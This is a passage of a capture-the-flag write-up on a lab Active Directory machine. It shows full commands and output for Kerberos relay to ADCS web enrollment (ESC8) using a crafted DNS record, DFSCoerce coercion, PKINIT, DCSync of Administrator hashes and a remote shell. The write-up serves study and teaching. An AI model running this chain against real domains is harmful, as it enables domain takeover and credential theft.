+</span></span></code></pre></div><p><code>CertEnroll</code> is the ADCS share - there&rsquo;s a CA running. I noted it and moved on for now. The other thing that jumped out: <code>profiles$</code> with READ,WRITE. Earlier over NFS we couldn&rsquo;t get into Rosie&rsquo;s Documents folder because of the UID mismatch. Maybe accessing it via authenticated SMB would expose it differently. Got a TGT with <code>kinit</code> and browsed with <code>smbclient.py</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kinit Rosie.Powell@CICADA.VL
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span>klist <span class="p">|</span> grep <span class="s2">&#34;Credentials cache&#34;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $NF}&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/vulncicada ❯ smbclient.py -k -no-pass DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># tree</span>
+</span></span><span class="line"><span class="cl">/Administrator/Documents
+</span></span><span class="line"><span class="cl">/Administrator/vacation.png
+</span></span><span class="line"><span class="cl">/Rosie.Powell/Documents
+</span></span><span class="line"><span class="cl">/Rosie.Powell/marketing.png
+</span></span><span class="line"><span class="cl">/Rosie.Powell/Documents/<span class="nv">$RECYCLE</span>.BIN
+</span></span><span class="line"><span class="cl">/Rosie.Powell/Documents/desktop.ini
+</span></span><span class="line"><span class="cl">/Rosie.Powell/Documents/<span class="nv">$RECYCLE</span>.BIN/desktop.ini
+</span></span><span class="line"><span class="cl">Finished - <span class="m">18</span> files and folders
+</span></span></code></pre></div><p>The Documents folder was accessible this time, but there was nothing in it except <code>$RECYCLE.BIN</code> and <code>desktop.ini</code>. Dead end.</p>
+<p>User descriptions sometimes hide passwords in AD environments, especially on older or misconfigured domains. Checked:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ nxc ldap DC-JPQ225.cicada.vl -u Rosie.Powell -p <span class="s1">&#39;Cicada123&#39;</span> -k --use-kcache -M get-desc-users
+</span></span><span class="line"><span class="cl">LDAP        DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:DC-JPQ225<span class="o">)</span> <span class="o">(</span>domain:CICADA.VL<span class="o">)</span> <span class="o">(</span>signing:None<span class="o">)</span> <span class="o">(</span>channel binding:Never<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        <span class="o">[</span>+<span class="o">]</span> CICADA.VL<span class="se">\R</span>osie.Powell from ccache
+</span></span><span class="line"><span class="cl">GET-DESC... DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        <span class="o">[</span>+<span class="o">]</span> Found following users: 
+</span></span><span class="line"><span class="cl">GET-DESC... DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        User: Administrator description: Built-in account <span class="k">for</span> administering the computer/domain
+</span></span><span class="line"><span class="cl">GET-DESC... DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        User: Guest description: Built-in account <span class="k">for</span> guest access to the computer/domain
+</span></span><span class="line"><span class="cl">GET-DESC... DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        User: krbtgt description: Key Distribution Center Service Account
+</span></span></code></pre></div><p>Only the three built-in accounts with their default descriptions. Nothing planted there. Kerberoasting and AS-REP roasting:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ GetUserSPNs.py -k -no-pass cicada.vl/Rosie.Powell@DC-JPQ225.cicada.vl -dc-host DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">No entries found!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/vulncicada ❯ GetNPUsers.py cicada.vl/ -k -no-pass -dc-host DC-JPQ225.cicada.vl -usersfile users.txt
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Administrator doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Daniel.Marshall doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Debra.Wright doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Jane.Carter doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Jordan.Francis doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Joyce.Andrews doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Katie.Ward doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Megan.Simpson doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Richard.Gibbons doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Rosie.Powell doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span></code></pre></div><p>No SPNs. No AS-REP roastable accounts. Checked Remote Management Users and Remote Desktop Users - both empty groups. NTLM being disabled kills psexec too, so lateral movement via service creation was off the table.</p>
+<p>At this point I had run out of obvious moves. I stopped and thought about what was actually there: a CA, an ESC8 finding from the initial certipy scan I hadn&rsquo;t run yet, and a Kerberos-only environment. The challenge author put that ADCS instance there for a reason. ESC8 normally means NTLM relay to the web enrollment endpoint - but NTLM is disabled. I hadn&rsquo;t seriously considered ADCS as a lateral movement path before, because every writeup I&rsquo;d read used it for privilege escalation. Running certipy now:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ certipy find -k -no-pass -u Rosie.Powell@cicada.vl -target DC-JPQ225.cicada.vl -dc-ip 10.129.18.173 -stdout -vulnerable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="sb">```</span>bash
+</span></span><span class="line"><span class="cl">…/labs/vulncicada ❯ certipy find -k -no-pass -u Rosie.Powell@cicada.vl -target DC-JPQ225.cicada.vl -dc-ip 10.129.18.173 -stdout -vulnerable
+</span></span><span class="line"><span class="cl">Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">33</span> certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate authorities
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">1</span> certificate authority
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">11</span> enabled certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Retrieving CA configuration <span class="k">for</span> <span class="s1">&#39;cicada-DC-JPQ225-CA&#39;</span> via RRP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking web enrollment <span class="k">for</span> CA <span class="s1">&#39;cicada-DC-JPQ225-CA&#39;</span> @ <span class="s1">&#39;DC-JPQ225.cicada.vl&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumeration output:
+</span></span><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    CA Name                             : cicada-DC-JPQ225-CA
+</span></span><span class="line"><span class="cl">    DNS Name                            : DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>cicada-DC-JPQ225-CA, <span class="nv">DC</span><span class="o">=</span>cicada, <span class="nv">DC</span><span class="o">=</span>vl
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 2951F0C8007D8DA54C38BA2749AD4E18
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2026-06-09 08:21:31+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2526-06-09 08:31:31+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment
+</span></span><span class="line"><span class="cl">      HTTP
+</span></span><span class="line"><span class="cl">        Enabled                         : True
+</span></span><span class="line"><span class="cl">      HTTPS
+</span></span><span class="line"><span class="cl">        Enabled                         : False
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption <span class="k">for</span> Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : CICADA.VL<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCa                        : CICADA.VL<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          CICADA.VL<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          CICADA.VL<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        ManageCertificates              : CICADA.VL<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          CICADA.VL<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          CICADA.VL<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Enroll                          : CICADA.VL<span class="se">\A</span>uthenticated Users
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>!<span class="o">]</span> Vulnerabilities
+</span></span><span class="line"><span class="cl">      ESC8                              : Web Enrollment is enabled over HTTP.
+</span></span><span class="line"><span class="cl">Certificate Templates                   : <span class="o">[</span>!<span class="o">]</span> Could not find any certificate templates
+</span></span></code></pre></div><p>ESC8. Web enrollment over HTTP. This is usually a pure NTLM relay attack - you coerce a machine account to authenticate, relay that NTLM authentication to the web enrollment endpoint at <code>/certsrv/</code>, and request a certificate on behalf of the victim. But NTLM is disabled. That should kill it.</p>
+<p>The reason the author put ESC8 here despite NTLM being off is the key insight: <strong>disabling NTLM doesn&rsquo;t disable relay attacks, it just changes the relay protocol</strong>.</p>
+<h2 id="esc8-via-kerberos-relay">ESC8 via Kerberos Relay</h2>
+<p>To understand why Kerberos relay works here, you need to understand why NTLM relay works in general - and what&rsquo;s fundamentally different about Kerberos.</p>
+<p>NTLM is a challenge-response protocol with no binding to a specific target. When a client authenticates via NTLM, the response doesn&rsquo;t contain any information about which server it was intended for. You can capture that response and replay it to any service that accepts NTLM. That&rsquo;s why disabling NTLM breaks the classic attack.</p>
+<p>Kerberos tickets are different - they&rsquo;re cryptographically bound to a specific Service Principal Name (SPN), like <code>HTTP/DC-JPQ225.cicada.vl</code>. You can&rsquo;t forward a ticket for one SPN to a different service. Which means Kerberos relay should be impossible.</p>
+<p>The trick is this: <strong>if you control the DNS name the victim resolves to, you also control the SPN they request a ticket for</strong>. When you add a DNS A record for <code>attacker.cicada.vl</code> pointing at your machine, and then coerce <code>DC-JPQ225$</code> to authenticate to <code>attacker.cicada.vl</code>, the DC requests a Kerberos ticket for <code>HTTP/attacker.cicada.vl</code>. You registered that name, so <code>krbrelayx</code> can act as the legitimate HTTP service at that address - it can respond to the AP-REQ because it controls the service. And because the DC thinks it&rsquo;s talking to a real service, not a relay, it hands over a valid service ticket. krbrelayx then turns around and presents that ticket to certsrv, which sees an authentication from <code>DC-JPQ225$</code> and issues a <code>DomainController</code> template certificate.</p>
+<p><em>Reference: <a href="https://www.thehacker.recipes/ad/movement/kerberos/relay">The Hacker Recipes - Kerberos Relay</a></em></p>
+<p><img src="/images/writeups/htb-vulncicada/krbrelayx-kerberos-relay-chain-diagram.png" alt="Diagram showing the Kerberos relay attack chain: RPC coercion forces DC to authenticate using a marshalled DNS hostname, krbrelayx receives the AP-REQ as the legitimate endpoint and relays it to certsrv to obtain a DC machine certificate"></p>
+<p>There&rsquo;s one more piece: the DNS name used isn&rsquo;t just any hostname, it&rsquo;s a specially crafted string that includes a marshalled <code>CREDENTIAL_TARGET_INFORMATION</code> structure. When Windows builds an SPN for a connection, it calls <code>SecMakeSPNEx2</code> which internally calls <code>CredMarshalTargetInfo</code>, appending a Base64-encoded structure to the hostname. The string looks like:</p>
+<pre tabindex="0"><code>DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
+</code></pre><p>Where <code>DC-JPQ225</code> is the NetBIOS name of the DC and the suffix is the minimal marshalled target info. When you register exactly this string as a DNS record and coerce the DC to connect to it, Windows resolves it, the AP-REQ arrives, and the ticket inside identifies <code>DC-JPQ225$</code> as the authenticating principal. That&rsquo;s who certsrv issues the certificate for.</p>
+<p>Rosie.Powell needs <code>CREATE_CHILD</code> on the DNS zones to add the record. Checking:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD -d cicada.vl -u Rosie.Powell -p <span class="s1">&#39;Cicada123&#39;</span> --host DC-JPQ225.cicada.vl -k get writable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">DC</span><span class="o">=</span>cicada.vl,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>cicada,DC<span class="o">=</span>vl
+</span></span><span class="line"><span class="cl">permission: CREATE_CHILD
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">DC</span><span class="o">=</span>_msdcs.cicada.vl,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>cicada,DC<span class="o">=</span>vl
+</span></span><span class="line"><span class="cl">permission: CREATE_CHILD
+</span></span></code></pre></div><p>All prerequisites checked. Time to run it.</p>
+<h3 id="step-1-start-krbrelayx">Step 1: Start krbrelayx</h3>
+<p><code>krbrelayx</code> listens for incoming Kerberos AP-REQ messages and relays them to the target - in this case the certsrv HTTP endpoint. The <code>DomainController</code> template is the one that produces a machine account certificate usable for PKINIT.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">krbrelayx master ❯ sudo python3 krbrelayx.py --target http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp --adcs --template DomainController --interface-ip 10.10.16.129
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client HTTPS loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client HTTP loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client LDAP loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client LDAPS loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client SMB loaded..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running in attack mode to single host
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running in kerberos relay mode because no credentials were specified.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Setting up SMB Server
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Setting up HTTP Server on port <span class="m">80</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Setting up DNS Server
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Servers started, waiting <span class="k">for</span> connections
+</span></span></code></pre></div><h3 id="step-2-add-the-malicious-dns-record">Step 2: Add the Malicious DNS Record</h3>
+<p>Add the crafted hostname as a DNS A record pointing at the attack machine:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">krbrelayx master ✗ bloodyAD -d cicada.vl -u Rosie.Powell -p <span class="s1">&#39;Cicada123&#39;</span> --host DC-JPQ225.cicada.vl --dc-ip 10.129.18.173 -k add dnsRecord <span class="s1">&#39;DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#39;</span> 10.10.16.129
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
+</span></span></code></pre></div><h3 id="step-3-coerce-the-dc-via-dfscoerce">Step 3: Coerce the DC via DFSCoerce</h3>
+<p>DFSCoerce triggers an outbound authentication from <code>DC-JPQ225$</code> via the MS-DFSNM protocol. The coercion target is the crafted hostname. <code>ERROR_BAD_NETPATH</code> is the expected response - it means the DC tried to reach the hostname, triggered the authentication, and got back a network error because our listener doesn&rsquo;t actually respond like a DFS server. The important thing happened: the AP-REQ was sent.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">DFSCoerce main ❯ <span class="nv">KRB5CCNAME</span><span class="o">=</span>/tmp/krb5cc_1000 python3 dfscoerce.py -k -no-pass <span class="s1">&#39;DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#39;</span> DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Connecting to ncacn_np:DC-JPQ225.cicada.vl<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\n</span>etdfs<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Successfully bound!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Sending NetrDfsRemoveStdRoot!
+</span></span><span class="line"><span class="cl">NetrDfsRemoveStdRoot 
+</span></span><span class="line"><span class="cl">ServerName:                      <span class="s1">&#39;DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\x00&#39;</span> 
+</span></span><span class="line"><span class="cl">RootShare:                       <span class="s1">&#39;test\x00&#39;</span> 
+</span></span><span class="line"><span class="cl">ApiFlags:                        <span class="m">1</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DFSNM SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
+</span></span></code></pre></div><h3 id="step-4-certificate-issued">Step 4: Certificate Issued</h3>
+<p>krbrelayx caught the AP-REQ, relayed it to certsrv, and got two certificates back (duplicate connections from the DC):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> SMBD: Received connection from 10.129.18.173
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> HTTP server returned status code 200, treating as a successful login
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> SMBD: Received connection from 10.129.18.173
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using template name: DomainController
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating CSR...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> CSR generated!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting certificate...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> HTTP server returned status code 200, treating as a successful login
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using template name: DomainController
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating CSR...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> CSR generated!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting certificate...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> GOT CERTIFICATE! ID <span class="m">88</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Writing PKCS#12 certificate to ./unknown4093.pfx
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate successfully written to file
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> GOT CERTIFICATE! ID <span class="m">89</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Writing PKCS#12 certificate to ./unknown2343.pfx
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate successfully written to file
+</span></span></code></pre></div><h2 id="pkinit-to-domain-admin">PKINIT to Domain Admin</h2>
+<p>With a certificate for <code>DC-JPQ225$</code>, PKINIT turns it into a TGT. <code>gettgtpkinit.py</code> from PKINITtools handles this - it performs the AS-REQ exchange using the certificate&rsquo;s private key instead of a password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PKINITtools master ❯ python3 gettgtpkinit.py -cert-pfx ~/work/htb/labs/vulncicada/unknown4093.pfx cicada.vl/<span class="s1">&#39;DC-JPQ225$&#39;</span> ~/work/htb/labs/vulncicada/dc.ccache
+</span></span><span class="line"><span class="cl">2026-06-09 13:38:34,259 minikerberos INFO     Loading certificate and key from file
+</span></span><span class="line"><span class="cl">2026-06-09 13:38:34,523 minikerberos INFO     Requesting TGT
+</span></span><span class="line"><span class="cl">2026-06-09 13:38:54,587 minikerberos INFO     AS-REP encryption key <span class="o">(</span>you might need this later<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">2026-06-09 13:38:54,588 minikerberos INFO     a41f17d4d450a7485bc33260fa0448a9b8dcb1a55ff077c1d1a3d98b45baa7ea
+</span></span><span class="line"><span class="cl">2026-06-09 13:38:54,592 minikerberos INFO     Saved TGT to file
+</span></span></code></pre></div><p>A TGT for the DC machine account. Machine account TGTs can perform DCSync because DCs have replication rights by design. <code>secretsdump</code> with the DC$ TGT extracts the Administrator hash:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PKINITtools master ❯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>~/work/htb/labs/vulncicada/dc.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PKINITtools master ❯ secretsdump.py -k -no-pass -just-dc-user Administrator cicada.vl/<span class="s1">&#39;DC-JPQ225$&#39;</span>@DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
+</span></span><span class="line"><span class="cl">Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
+</span></span><span class="line"><span class="cl">Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
+</span></span><span class="line"><span class="cl">Administrator:des-cbc-md5:fd2a29621f3e7604
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
+</span></span></code></pre></div><p>NTLM is disabled so pass-the-hash over SMB won&rsquo;t work. Instead, use the NT hash to request a TGT via <code>getTGT.py</code> - this is still valid because Kerberos AS-REQ with RC4 encryption uses the NT hash directly:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PKINITtools master ❯ getTGT.py -hashes :85a0da53871a9d56b6cd05deda3a5e87 cicada.vl/Administrator@DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in Administrator@DC-JPQ225.cicada.vl.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>~/work/htb/labs/vulncicada/Administrator@DC-JPQ225.cicada.vl.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ evil-winrm -i DC-JPQ225.cicada.vl -r CICADA.VL
+</span></span></code></pre></div><p>Administrator shell. Root flag.</p>
+<p>The mental model I&rsquo;d take from this: &ldquo;NTLM disabled&rdquo; is a hardening measure that kills a class of relay attacks, but relay attacks as a concept are not NTLM-specific. Anything where you can be the target the victim authenticates to, and then turn around and use that authentication against a third party, is a relay attack. With Kerberos, the binding to SPNs looks like it prevents this - until you realize that DNS control means SPN control. This is why Kerberos-only environments still need coercion mitigations, and why the attack surface of AD is genuinely hard to fully lock down.</p>
+<p><em>References:</em></p>
+<ul>
+<li><em><a href="https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/">Dirk-jan Mollema - Relaying Kerberos over DNS with krbrelayx and mitm6</a></em> - the author of krbrelayx explaining the DNS SOA trick and how Kerberos relay over HTTP works mechanically</li>
+<li><em><a href="https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/">Decoder&rsquo;s Blog - From NTLM Relay to Kerberos Relay: Everything You Need to Know</a></em> - covers the full AP-REQ forwarding mechanics and explicitly argues that Kerberos is not the solution to relay attacks</li>
+<li><em><a href="https://www.synacktiv.com/en/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with">Synacktiv - Abusing Multicast Poisoning for Pre-Authenticated Kerberos Relay over HTTP with ADCS</a></em> - specifically covers relaying Kerberos over HTTP to ADCS when NTLM is disabled</li>
+</ul>
+
+            </div>
+        </article></main>
+</div>
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+        if (!content || !button) return;
+        content.classList.toggle('expanded');
+        button.classList.toggle('expanded');
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        if (miniToc) miniToc.classList.toggle('minimized');
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                const el = document.getElementById(decodeURIComponent(href.slice(1)));
+                if (el) return { link, element: el };
+            }
+            return null;
+        }).filter(Boolean);
+
+        if (targets.length === 0) return;
+
+        function update() {
+            const scrollPosition = window.scrollY + 100;
+            let active = null;
+            targets.forEach(t => {
+                if (t.element.offsetTop <= scrollPosition) active = t;
+            });
+            links.forEach(l => l.classList.remove('active'));
+            if (active) active.link.classList.add('active');
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => { update(); ticking = false; });
+                ticking = true;
+            }
+        });
+        update();
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const sourceToc = document.getElementById('tocContent');
+        if (!miniToc || !miniTocContent || !sourceToc) return;
+
+        const clone = sourceToc.cloneNode(true);
+        clone.classList.remove('toc-content', 'expanded');
+        clone.removeAttribute('id');
+
+        const links = clone.querySelectorAll('a');
+        if (links.length === 0) return;
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                const href = link.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        history.pushState(null, '', href);
+                    }
+                }
+            });
+        });
+
+        miniTocContent.appendChild(clone);
+        miniToc.classList.add('visible');
+        setupActiveHighlighting(links);
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+<footer class="footer">
+    <span class="footer_item"> </span>
